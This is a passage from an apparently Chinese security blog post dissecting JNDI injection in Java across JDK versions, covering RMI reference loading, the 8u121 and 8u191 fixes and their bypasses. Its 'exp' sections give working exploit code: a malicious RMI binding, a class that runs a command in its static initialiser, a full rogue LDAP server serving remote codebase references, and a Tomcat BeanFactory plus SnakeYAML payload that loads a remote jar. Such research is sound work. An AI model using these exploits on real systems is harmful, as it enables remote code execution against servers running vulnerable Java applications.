+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">LocateRegistry.createRegistry(<span class="number">1099</span>);</span><br><span class="line">        Reference reference = new Reference(<span class="string">&quot;aa&quot;</span>, <span class="string">&quot;exp&quot;</span>, <span class="string">&quot;http://127.0.0.1:8000/&quot;</span>);</span><br><span class="line">#这里第一个参数是className随便填就好，后面是根据第三个参数Location加上第二个参数FactoryName进行远程加载</span><br><span class="line">#这里最后请求的就是http:<span class="comment">//127.0.0.1:8000/exp.class</span></span><br><span class="line">        InitialContext initialContext = new InitialContext();</span><br><span class="line">        initialContext.bind(<span class="string">&quot;rmi://127.0.0.1:1099/test&quot;</span>,reference);</span><br></pre></td></tr></table></figure>
+<p>客户端</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">InitialContext initialContext = new InitialContext();</span><br><span class="line">       initialContext.lookup(<span class="string">&quot;rmi://127.0.0.1:1099/test&quot;</span>);</span><br></pre></td></tr></table></figure>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">import java.io.IOException;</span><br><span class="line"></span><br><span class="line">public <span class="class"><span class="keyword">class</span> <span class="title">exp</span> &#123;</span></span><br><span class="line">    <span class="type">static</span> &#123;</span><br><span class="line">        try &#123;</span><br><span class="line">            Runtime.getRuntime().exec(<span class="string">&quot;code&quot;</span>);</span><br><span class="line">        &#125; catch (IOException e) &#123;</span><br><span class="line">            throw new RuntimeException(e);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><p>主要处理逻辑就是getObjectFactoryFromReference这个函数<br><img src="https://cdn.nlark.com/yuque/0/2023/png/29417415/1700963682577-ecf0b0ac-dcc8-4d9f-9f12-5cf5d2866d52.png#averageHue=%23252629&clientId=u1a12a276-8a25-4&from=drop&id=ued3e0903&originHeight=1586&originWidth=1428&originalType=binary&ratio=2&rotation=0&showTitle=false&size=1400176&status=done&style=none&taskId=u9b6cf6a4-80a0-4385-b41c-503339944b5&title=" alt="截屏2023-11-26 09.54.34.png"><br>这里的factoryName就是服务端注册时候写的factoryName，最开始使用AppClassLoader去加载，因为都是随便写的类名，肯定加载不出来<br><img src="https://cdn.nlark.com/yuque/0/2023/png/29417415/1700963813107-a4274834-dd8d-4085-994c-a7ce93239603.png#averageHue=%232f333d&clientId=u1a12a276-8a25-4&from=drop&id=u1bd89622&originHeight=288&originWidth=1972&originalType=binary&ratio=2&rotation=0&showTitle=false&size=403369&status=done&style=none&taskId=u47d45e22-56aa-4903-9e6c-bd87e9532cb&title=" alt="截屏2023-11-26 09.56.47.png"><br>然后如果这里我们的FactoryClassLocation不为空，这个也是服务端注册时候写的http地址，那么他就会用URLClassLoader进行加载<br><img src="https://cdn.nlark.com/yuque/0/2023/png/29417415/1700965487666-2e7d0681-aae8-41b5-862a-4f794121ccd0.png#averageHue=%23272a33&clientId=u1a12a276-8a25-4&from=drop&id=u5ff680ba&originHeight=490&originWidth=1914&originalType=binary&ratio=2&rotation=0&showTitle=false&size=572821&status=done&style=none&taskId=uf9f45320-f83a-4525-bdef-33172bfa4a2&title=" alt="截屏2023-11-26 10.24.41.png"></p>
+<h2 id="121-191"><a href="#121-191" class="headerlink" title="121-191"></a>121-191</h2><h3 id="修复措施"><a href="#修复措施" class="headerlink" title="修复措施"></a>修复措施</h3><p>从8u121开始进行了修复，这个版本的修复措施是在rmi里面加了一些限制<br>在rmi的RegistryContext里有一个trustURLCodebase，默认是false<br><img src="https://cdn.nlark.com/yuque/0/2023/png/29417415/1700907938734-ac392fe2-5789-44b6-958d-302272e872be.png#averageHue=%2327292c&clientId=u1a12a276-8a25-4&from=drop&id=uf6af9e0f&originHeight=770&originWidth=1858&originalType=binary&ratio=2&rotation=0&showTitle=false&size=867536&status=done&style=none&taskId=u56674979-672e-420c-a56c-2c62dbcd264&title=" alt="截屏2023-11-25 18.25.35.png"><br>如果发现FactoryClassLocation不是空，那么只有当trustURLCodebase为True才会进入NamingManager.getObjectInstance进行远程加载，不然就会报错<br><img src="https://cdn.nlark.com/yuque/0/2023/png/29417415/1700908047119-3e754eca-b2cf-4675-92d1-729253035131.png#averageHue=%232e3136&clientId=u1a12a276-8a25-4&from=drop&id=u8329cdde&originHeight=1034&originWidth=2540&originalType=binary&ratio=2&rotation=0&showTitle=false&size=1628170&status=done&style=none&taskId=u3dcba3c2-3082-47cb-8548-38ea3787eec&title=" alt="截屏2023-11-25 18.27.22.png"></p>
+<h3 id="绕过"><a href="#绕过" class="headerlink" title="绕过"></a>绕过</h3><p>rmi这里的口子被堵住了，但是通过前面分析我们可以知道，真正的加载逻辑是在NamingManager.getObjectFactoryFromReference里面做的<br>一共有两个地方都调用了getObjectFactoryFromReference，一个就是我们rmi里面的NamingManager.getObjectInstance<br><img src="https://cdn.nlark.com/yuque/0/2023/png/29417415/1700962774547-efc6a1b2-a522-4041-adeb-93eb90d749ff.png#averageHue=%233a3c3f&clientId=u1a12a276-8a25-4&from=drop&id=u25981d7f&originHeight=332&originWidth=1052&originalType=binary&ratio=2&rotation=0&showTitle=false&size=251660&status=done&style=none&taskId=uf86cea14-4527-4663-93e7-2b3fed09f2e&title=" alt="截屏2023-11-26 09.39.30.png"><br>还有一个就是ldap里用到的DirectoryManager.getObjectInstance，可以看到ldap里面仍然可以进行加载逻辑<br><img src="https://cdn.nlark.com/yuque/0/2023/png/29417415/1700962462084-e0a70b53-a19a-45c2-9d4a-b0280ae1f1bd.png#averageHue=%23282a31&clientId=u1a12a276-8a25-4&from=drop&id=u67f31ffb&originHeight=734&originWidth=1298&originalType=binary&ratio=2&rotation=0&showTitle=false&size=578204&status=done&style=none&taskId=u2c31b1de-94b2-4431-87c2-5dcae44e442&title=" alt="截屏2023-11-26 09.34.16.png"></p>
+<h3 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h3><p>那么我们使用ldap进行攻击</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;dependency&gt;</span><br><span class="line">          &lt;groupId&gt;com.unboundid&lt;/groupId&gt;</span><br><span class="line">          &lt;artifactId&gt;unboundid-ldapsdk&lt;/artifactId&gt;</span><br><span class="line">          &lt;version&gt;<span class="number">5.1</span><span class="number">.4</span>&lt;/version&gt; &lt;!-- Use the latest version available --&gt;</span><br><span class="line">      &lt;/dependency&gt;</span><br></pre></td></tr></table></figure>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line">import java.net.InetAddress;</span><br><span class="line"></span><br><span class="line">import javax.net.ServerSocketFactory;</span><br><span class="line">import javax.net.SocketFactory;</span><br><span class="line">import javax.net.ssl.SSLSocketFactory;</span><br><span class="line"></span><br><span class="line">import com.unboundid.ldap.listener.InMemoryDirectoryServer;</span><br><span class="line">import com.unboundid.ldap.listener.InMemoryDirectoryServerConfig;</span><br><span class="line">import com.unboundid.ldap.listener.InMemoryListenerConfig;</span><br><span class="line">import com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult;</span><br><span class="line">import com.unboundid.ldap.listener.interceptor.InMemoryOperationInterceptor;</span><br><span class="line">import com.unboundid.ldap.sdk.Entry;</span><br><span class="line">import com.unboundid.ldap.sdk.LDAPException;</span><br><span class="line">import com.unboundid.ldap.sdk.LDAPResult;</span><br><span class="line">import com.unboundid.ldap.sdk.ResultCode;</span><br><span class="line"></span><br><span class="line">public <span class="class"><span class="keyword">class</span> <span class="title">demo</span> &#123;</span></span><br><span class="line"></span><br><span class="line">    private <span class="type">static</span> final String LDAP_BASE = <span class="string">&quot;dc=example,dc=com&quot;</span>;</span><br><span class="line">    private  <span class="type">static</span> <span class="type">int</span> PORT = <span class="number">7777</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    public <span class="type">static</span> <span class="type">void</span> <span class="title function_">main</span> <span class="params">( String[] tmp_args )</span> throws  Exception &#123;</span><br><span class="line">        InMemoryDirectoryServerConfig config = new InMemoryDirectoryServerConfig(LDAP_BASE);</span><br><span class="line">        config.setListenerConfigs(new InMemoryListenerConfig(</span><br><span class="line">                    <span class="string">&quot;listen&quot;</span>, <span class="comment">//$NON-NLS-1$</span></span><br><span class="line">                    InetAddress.getByName(<span class="string">&quot;0.0.0.0&quot;</span>), <span class="comment">//$NON-NLS-1$</span></span><br><span class="line">                PORT,</span><br><span class="line">                    ServerSocketFactory.getDefault(),</span><br><span class="line">                    SocketFactory.getDefault(),</span><br><span class="line">                    (SSLSocketFactory) SSLSocketFactory.getDefault()));</span><br><span class="line"></span><br><span class="line">            config.addInMemoryOperationInterceptor(new OperationInterceptor());</span><br><span class="line">            InMemoryDirectoryServer ds = new InMemoryDirectoryServer(config);</span><br><span class="line">            System.out.println(<span class="string">&quot;Listening on 0.0.0.0:&quot;</span> + PORT); <span class="comment">//$NON-NLS-1$</span></span><br><span class="line">            ds.startListening();</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    private <span class="type">static</span> <span class="class"><span class="keyword">class</span> <span class="title">OperationInterceptor</span> <span class="title">extends</span> <span class="title">InMemoryOperationInterceptor</span> &#123;</span></span><br><span class="line">        private <span class="type">static</span> String URI=<span class="string">&quot;http://127.0.0.1:8000/&quot;</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        @Override</span><br><span class="line">        public <span class="type">void</span> <span class="title function_">processSearchResult</span> <span class="params">( InMemoryInterceptedSearchResult result )</span>   &#123;</span><br><span class="line">            String base = result.getRequest().getBaseDN();</span><br><span class="line">            Entry e = new Entry(base);</span><br><span class="line"></span><br><span class="line">            System.out.println(<span class="string">&quot;Send LDAP reference result for &quot;</span> + base + <span class="string">&quot; redirecting to &quot;</span> + URI+base+<span class="string">&quot;.class&quot;</span>);</span><br><span class="line">            e.addAttribute(<span class="string">&quot;javaClassName&quot;</span>, <span class="string">&quot;foo&quot;</span>);</span><br><span class="line"></span><br><span class="line">            e.addAttribute(<span class="string">&quot;javaCodeBase&quot;</span>, URI);</span><br><span class="line">            e.addAttribute(<span class="string">&quot;objectClass&quot;</span>, <span class="string">&quot;javaNamingReference&quot;</span>); <span class="comment">//$NON-NLS-1$</span></span><br><span class="line">            e.addAttribute(<span class="string">&quot;javaFactory&quot;</span>,base);</span><br><span class="line"></span><br><span class="line">            try &#123;</span><br><span class="line">                result.sendSearchEntry(e);</span><br><span class="line">            &#125; catch (LDAPException ex) &#123;</span><br><span class="line">                throw new RuntimeException(ex);</span><br><span class="line">            &#125;</span><br><span class="line">            result.setResult(new LDAPResult(<span class="number">0</span>, ResultCode.SUCCESS));</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>客户端去连接</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">InitialContext initialContext = new InitialContext();</span><br><span class="line">       initialContext.lookup(<span class="string">&quot;ldap://127.0.0.1:7777/exp&quot;</span>);</span><br></pre></td></tr></table></figure>
+<h3 id="分析-1"><a href="#分析-1" class="headerlink" title="分析"></a>分析</h3><p>也是经过一系列的处理，最后来到了getObjectFactoryFromReference进行了远程类加载，后面的加载逻辑和之前的rmi都类似<br><img src="https://cdn.nlark.com/yuque/0/2023/png/29417415/1700966317565-f827b789-5a69-4e76-bd1b-41c5a7921408.png#averageHue=%23373a42&clientId=u1a12a276-8a25-4&from=drop&id=ue2b17a57&originHeight=1202&originWidth=2178&originalType=binary&ratio=2&rotation=0&showTitle=false&size=1588336&status=done&style=none&taskId=ua3a5b591-397e-43e3-9d30-d9febb84d84&title=" alt="截屏2023-11-26 10.38.28.png"></p>
+<h2 id="191之后"><a href="#191之后" class="headerlink" title="191之后"></a>191之后</h2><h3 id="修复措施-1"><a href="#修复措施-1" class="headerlink" title="修复措施"></a>修复措施</h3><p>在8u191引入的修复方案，也算是真正意义上的修复<br>之前121版本的修复方案给人的感觉是，这个修复的人并不是很了解jndi背后的加载逻辑。<br>jndi他的处理流程大概是，先用rmi\ldap进行一个简单的信息处理，然后都统一回到NamingManager里进行加载，所以想要修复这个问题不应该放在rmi\ldap处理的逻辑里，放在NamingManager里统一拦截检查是比较合理的<br>又加了一个trustURLCodebase<br><img src="https://cdn.nlark.com/yuque/0/2023/png/29417415/1700921077502-306083da-9367-427a-a19d-fb0a19826c69.png#averageHue=%23242528&clientId=u1a12a276-8a25-4&from=drop&id=u4e1f84c5&originHeight=696&originWidth=1398&originalType=binary&ratio=2&rotation=0&showTitle=false&size=590028&status=done&style=none&taskId=uba1d6f4c-dcef-4d6e-851d-9ddc44358ae&title=" alt="截屏2023-11-25 22.04.33.png"><br>他这个check机制是专门放在了loadClass处理codebase这种情况，默认情况下trustURLCodebase为false，就不允许远程加载，所以这个修复方案是彻底把ldap\rmi这种远程加载给堵住了<br><img src="https://cdn.nlark.com/yuque/0/2023/png/29417415/1700921124864-624503f7-c0d8-439d-ad09-8ce0398e72d0.png#averageHue=%232e3036&clientId=u1a12a276-8a25-4&from=drop&id=u81efbe2f&originHeight=1326&originWidth=2088&originalType=binary&ratio=2&rotation=0&showTitle=false&size=1694791&status=done&style=none&taskId=uc43574b3-4e6b-4607-b688-6a3050e5f21&title=" alt="截屏2023-11-25 22.05.17.png"></p>
+<h3 id="绕过-1"><a href="#绕过-1" class="headerlink" title="绕过"></a>绕过</h3><p>既然不允许远程加载，那就把目光放在依赖库里，看有没有可以利用的一些类<br>要求Factory必须实现ObjectFactory接口<br><img src="https://cdn.nlark.com/yuque/0/2023/png/29417415/1700971434640-06b72c44-d104-4908-99c7-932ce9c7514d.png#averageHue=%232b2c30&clientId=u43406b06-e91d-4&from=drop&id=u59844ae1&originHeight=92&originWidth=1092&originalType=binary&ratio=2&rotation=0&showTitle=false&size=67891&status=done&style=none&taskId=u44dae106-5492-45b8-bb83-cead77aa3e0&title=" alt="截屏2023-11-26 12.03.51.png"><br>这里把目光瞄准了BeanFactory</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;dependency&gt;</span><br><span class="line">            &lt;groupId&gt;org.apache.tomcat&lt;/groupId&gt;</span><br><span class="line">            &lt;artifactId&gt;tomcat-catalina&lt;/artifactId&gt;</span><br><span class="line">            &lt;version&gt;<span class="number">8.5</span><span class="number">.0</span>&lt;/version&gt;</span><br><span class="line">        &lt;/dependency&gt;</span><br></pre></td></tr></table></figure>
+<p>要想进入getObjectInstance首先要保证FactoryClassLocation为null<br><img src="https://cdn.nlark.com/yuque/0/2023/png/29417415/1700974042207-f57abe35-0e0b-450e-8c7c-e77c7cc20107.png#averageHue=%23292b32&clientId=u43406b06-e91d-4&from=drop&id=u379ffd9a&originHeight=246&originWidth=1444&originalType=binary&ratio=2&rotation=0&showTitle=false&size=249502&status=done&style=none&taskId=u1a2d79d3-4b68-4293-a8c9-2695f5c4bf5&title=" alt="截屏2023-11-26 12.47.17.png"><br>所以我们先这么写</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">LocateRegistry.createRegistry(<span class="number">1099</span>);</span><br><span class="line">Reference resourceRef = new Reference(<span class="string">&quot;aa&quot;</span>,<span class="string">&quot;org.apache.naming.factory.BeanFactory&quot;</span>,null);</span><br><span class="line">InitialContext initialContext = new InitialContext();</span><br><span class="line">initialContext.bind(<span class="string">&quot;rmi://127.0.0.1:1099/test&quot;</span>,resourceRef);</span><br></pre></td></tr></table></figure>
+<p>可以看到BeanFactory成功被实例化出来，然后执行getObjectInstance方法，这个里面的obj就是服务端的Reference，那么我们需要重新构造一下<br><img src="https://cdn.nlark.com/yuque/0/2023/png/29417415/1700974150625-72628364-97bd-406a-bb8b-2ff84f71ed10.png#averageHue=%23292b30&clientId=u43406b06-e91d-4&from=drop&id=ud9443891&originHeight=1340&originWidth=1210&originalType=binary&ratio=2&rotation=0&showTitle=false&size=944522&status=done&style=none&taskId=u21f37337-3e58-46e1-9772-cd4e92d448c&title=" alt="截屏2023-11-26 12.49.05.png"><br>参数先随便写，看看需要怎么调整</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">LocateRegistry.createRegistry(<span class="number">1099</span>);</span><br><span class="line">        ResourceRef resourceRef = new ResourceRef(<span class="string">&quot;ss&quot;</span>, <span class="string">&quot;aa&quot;</span>, <span class="string">&quot;aa&quot;</span>, <span class="string">&quot;aa&quot;</span>, <span class="literal">false</span>, <span class="string">&quot;org.apache.naming.factory.BeanFactory&quot;</span>, null);</span><br><span class="line">       InitialContext initialContext = new InitialContext();</span><br><span class="line">        initialContext.bind(<span class="string">&quot;rmi://127.0.0.1:1099/test&quot;</span>,resourceRef);</span><br></pre></td></tr></table></figure>
+<p>这里的beanClass是第一个参数，要是一个类名<br><img src="https://cdn.nlark.com/yuque/0/2023/png/29417415/1700974481780-db40561b-426f-4802-9f8f-d7f70170bb48.png#averageHue=%232c2f38&clientId=u43406b06-e91d-4&from=drop&id=udc007ffd&originHeight=436&originWidth=1200&originalType=binary&ratio=2&rotation=0&showTitle=false&size=366406&status=done&style=none&taskId=u0e8e6237-eb5b-492e-9e6e-b8cd744c415&title=" alt="截屏2023-11-26 12.54.36.png"><br>我们先随便来一个hashmap</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">LocateRegistry.createRegistry(<span class="number">1099</span>);</span><br><span class="line">        ResourceRef resourceRef = new ResourceRef(<span class="string">&quot;java.util.HashMap&quot;</span>, <span class="string">&quot;aa&quot;</span>, <span class="string">&quot;aa&quot;</span>, <span class="string">&quot;aa&quot;</span>, <span class="literal">false</span>, <span class="string">&quot;org.apache.naming.factory.BeanFactory&quot;</span>, null);</span><br><span class="line">       InitialContext initialContext = new InitialContext();</span><br><span class="line">        initialContext.bind(<span class="string">&quot;rmi://127.0.0.1:1099/test&quot;</span>,resourceRef);</span><br></pre></td></tr></table></figure>
+<p>类成功被加载，同时实例化了一个对象，这里调用的是public的无参构造函数，也就要求我们这个类必须有public的无参构造函数<br><img src="https://cdn.nlark.com/yuque/0/2023/png/29417415/1700975473577-a984ae52-aa30-43f2-86dc-52e4df7bc11c.png#averageHue=%23333947&clientId=u43406b06-e91d-4&from=drop&id=uc08b9020&originHeight=214&originWidth=876&originalType=binary&ratio=2&rotation=0&showTitle=false&size=155010&status=done&style=none&taskId=u786c2a1f-fa21-4ab9-86de-ca3cadd21d8&title=" alt="截屏2023-11-26 13.11.10.png"><br>这里ref.get就是从传入的addrs里面取，我们也加一个forceString<br><img src="https://cdn.nlark.com/yuque/0/2023/png/29417415/1700975004679-0d863dfc-12b2-45c9-b1f0-31a7fe58b62f.png#averageHue=%2327282b&clientId=u43406b06-e91d-4&from=drop&id=u9a1dfbb9&originHeight=462&originWidth=862&originalType=binary&ratio=2&rotation=0&showTitle=false&size=256723&status=done&style=none&taskId=ud17e9fcd-72d0-4ea6-b4b4-345b594f439&title=" alt="截屏2023-11-26 13.03.00.png"><br>这里我们随便写个String</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">LocateRegistry.createRegistry(<span class="number">1099</span>);</span><br><span class="line">        ResourceRef resourceRef = new ResourceRef(<span class="string">&quot;java.util.HashMap&quot;</span>, <span class="string">&quot;aa&quot;</span>, <span class="string">&quot;aa&quot;</span>, <span class="string">&quot;aa&quot;</span>, <span class="literal">false</span>, <span class="string">&quot;org.apache.naming.factory.BeanFactory&quot;</span>, null);</span><br><span class="line">        resourceRef.add(new StringRefAddr(<span class="string">&quot;forceString&quot;</span>, <span class="string">&quot;x=load&quot;</span>));</span><br><span class="line">       InitialContext initialContext = new InitialContext();</span><br><span class="line">        initialContext.bind(<span class="string">&quot;rmi://127.0.0.1:1099/test&quot;</span>,resourceRef);</span><br></pre></td></tr></table></figure>
+<p>这里可以看一下大概逻辑，value先按照,分割，我们这里只有一个，然后按照&#x3D;号分割，这里的propName就是&#x3D;后面的load,然后param就是&#x3D;前面的x<img src="https://cdn.nlark.com/yuque/0/2023/png/29417415/1700976124940-bb33f919-51b8-4c7d-8668-7f3354ffa403.png#averageHue=%232a2c32&clientId=u43406b06-e91d-4&from=drop&id=uecb30358&originHeight=1316&originWidth=1674&originalType=binary&ratio=2&rotation=0&showTitle=false&size=1339329&status=done&style=none&taskId=u25934e67-e332-492e-9428-0da833994da&title=" alt="截屏2023-11-26 13.22.00.png"><br>这里相当于会反射获取一个method，参数类型为String，名字我们指定，这里是load，然后会把这个method放入forced里，key是param，这里的key是x<br>后面会进行一个invoke调用<br><img src="https://cdn.nlark.com/yuque/0/2023/png/29417415/1700976228059-e403538c-aa8d-4c88-8cb1-fb8374e0da2d.png#averageHue=%232a2b2f&clientId=u43406b06-e91d-4&from=drop&id=u941a6c93&originHeight=128&originWidth=714&originalType=binary&ratio=2&rotation=0&showTitle=false&size=61386&status=done&style=none&taskId=u0a55e23c-0df3-4870-89fb-553fc8b3ef9&title=" alt="截屏2023-11-26 13.23.44.png"><br>那么大概我们可以看出来，需要的类有一个public的无参构造函数，然后可以调用一个public的参数为Str的函数<br>这里我们可以很容易想到snakeyaml<br>网上有用ELProcessor.eval,GroovyClassLoader.parseClass,GroovyShell.evaluate,这几个都可以，看具体依赖情况，我这里是用snakeyaml来打</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">LocateRegistry.createRegistry(<span class="number">1099</span>);</span><br><span class="line">        ResourceRef resourceRef = new ResourceRef(<span class="string">&quot;org.yaml.snakeyaml.Yaml&quot;</span>, <span class="string">&quot;aa&quot;</span>, <span class="string">&quot;aa&quot;</span>, <span class="string">&quot;aa&quot;</span>, <span class="literal">false</span>, <span class="string">&quot;org.apache.naming.factory.BeanFactory&quot;</span>, null);</span><br><span class="line">        resourceRef.add(new StringRefAddr(<span class="string">&quot;forceString&quot;</span>, <span class="string">&quot;x=load&quot;</span>));</span><br><span class="line">       InitialContext initialContext = new InitialContext();</span><br><span class="line">        initialContext.bind(<span class="string">&quot;rmi://127.0.0.1:1099/test&quot;</span>,resourceRef);</span><br></pre></td></tr></table></figure>
+<p>但是出现了一个新的问题，这里先取出来的是description,然后直接跳出了while的循环，然后会forced.get(“description”),但实际上method是保存在x里，所以这里的思路是我们把description传入null<br><img src="https://cdn.nlark.com/yuque/0/2023/png/29417415/1700976633939-e723fa97-c972-438f-8c51-a193e1d49b46.png#averageHue=%23282a31&clientId=u43406b06-e91d-4&from=drop&id=u9cc91c49&originHeight=722&originWidth=1532&originalType=binary&ratio=2&rotation=0&showTitle=false&size=711275&status=done&style=none&taskId=ua16e16df-8ebb-40ad-9fc5-507cedf620d&title=" alt="截屏2023-11-26 13.30.29.png"><br>然后这里的参数是从ra.getContent里面获取的，也就是我们需要再传入一个addr,他的名字是x,内容是snakeyaml的payload</p>
+<h3 id="exp-2"><a href="#exp-2" class="headerlink" title="exp"></a>exp</h3><p>服务端</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">LocateRegistry.createRegistry(<span class="number">1099</span>);</span><br><span class="line">        ResourceRef resourceRef = new ResourceRef(<span class="string">&quot;org.yaml.snakeyaml.Yaml&quot;</span>, null, <span class="string">&quot;aa&quot;</span>, <span class="string">&quot;aa&quot;</span>, <span class="literal">false</span>, <span class="string">&quot;org.apache.naming.factory.BeanFactory&quot;</span>, null);</span><br><span class="line">        resourceRef.add(new StringRefAddr(<span class="string">&quot;forceString&quot;</span>, <span class="string">&quot;x=load&quot;</span>));</span><br><span class="line">        String yaml=<span class="string">&quot;!!javax.script.ScriptEngineManager [\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;  !!java.net.URLClassLoader [[\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;    !!java.net.URL [\&quot;http://127.0.0.1:8080/yaml-payload.jar\&quot;]\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;  ]]\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;]&quot;</span>;</span><br><span class="line">        resourceRef.add(new StringRefAddr(<span class="string">&quot;x&quot;</span>, yaml));</span><br><span class="line">       InitialContext initialContext = new InitialContext();</span><br><span class="line">        initialContext.bind(<span class="string">&quot;rmi://127.0.0.1:1099/test&quot;</span>,resourceRef);</span><br></pre></td></tr></table></figure>
+<p>客户端依赖</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;dependency&gt;</span><br><span class="line">           &lt;groupId&gt;org.apache.tomcat&lt;/groupId&gt;</span><br><span class="line">           &lt;artifactId&gt;tomcat-catalina&lt;/artifactId&gt;</span><br><span class="line">           &lt;version&gt;<span class="number">8.5</span><span class="number">.0</span>&lt;/version&gt;</span><br><span class="line">       &lt;/dependency&gt;</span><br><span class="line">       &lt;dependency&gt;</span><br><span class="line">           &lt;groupId&gt;org.yaml&lt;/groupId&gt;</span><br><span class="line">           &lt;artifactId&gt;snakeyaml&lt;/artifactId&gt;</span><br><span class="line">           &lt;version&gt;<span class="number">1.33</span>&lt;/version&gt;</span><br><span class="line">       &lt;/dependency&gt;</span><br></pre></td></tr></table></figure>
